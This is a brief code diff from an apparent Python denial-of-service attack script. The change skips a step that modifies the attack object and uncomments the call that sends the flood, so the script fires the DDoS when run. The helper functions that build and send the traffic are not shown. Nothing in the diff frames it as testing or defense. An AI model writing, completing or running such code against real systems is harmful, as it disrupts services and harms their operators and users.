@@ -33,10 +33,11 @@ def retrieve_arguments():
 def perform_attack():
     script_args = retrieve_arguments()
     ddos_attack_object = create_ddos_attack_object(script_args)
-    modified_ddos_attack_object = modify_ddos_attack_object(
-        ddos_attack_object, script_args)
-    #send_ddos_attack_object(modified_ddos_attack_object,
-    # script_args)
+    modified_ddos_attack_object = ddos_attack_object
+    #modified_ddos_attack_object = modify_ddos_attack_object(
+    #    ddos_attack_object, script_args)
+    send_ddos_attack_object(modified_ddos_attack_object,
+     script_args)
 
 if __name__ == "__main__":
     perform_attack()
